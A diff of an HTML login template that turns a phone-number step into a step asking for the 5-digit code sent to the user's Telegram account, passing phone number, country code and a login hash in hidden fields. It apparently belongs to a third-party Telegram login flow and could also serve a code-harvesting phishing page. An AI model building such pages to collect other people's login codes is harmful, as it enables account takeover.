@@ -18,18 +18,22 @@
                     <div class="form-group">
                         <div class="row justify-content-center align-items-center mb-3">
                             <span class="text-white-50 text-center">
-                                Please confirm your country code and enter your phone number.
+                                Please enter the 5-digit code we sent to your Telegram account.
                             </span>
                         </div>
                         <div class="input-group mb-1">
                             <div class="input-group-prepend">
-                                <div class="input-group-text" style="background-color: #8774e1 !important; color: white; border-color: #454544 !important;"> + </div>
+                                <div class="input-group-text" style="background-color: #8774e1 !important; color: white; border-color: #454544 !important;">CODE</div>
                             </div>
-                            <!-- <input class="form-control" type="tel" placeholder="11234567890" style="background-color:transparent !important; border-color: #454544 !important; color: white !important;" required> -->
+                            {{ form.verification_code }}
+                        </div>
+                        <div style="display: none;">
+                            {{ form.login_hash }}
                             {{ form.phone_number }}
+                            {{ form.country_code }}
                         </div>
                         <small class="text-muted" style="color: red !important;">
-                            Must be 8-20 characters long.
+                            Must be 5 characters long.
                         </small>
                         <button class="form-control btn mt-3" type="submit" style="background-color: #8774e1 !important; color: white;">NEXT</button>
                     </div>
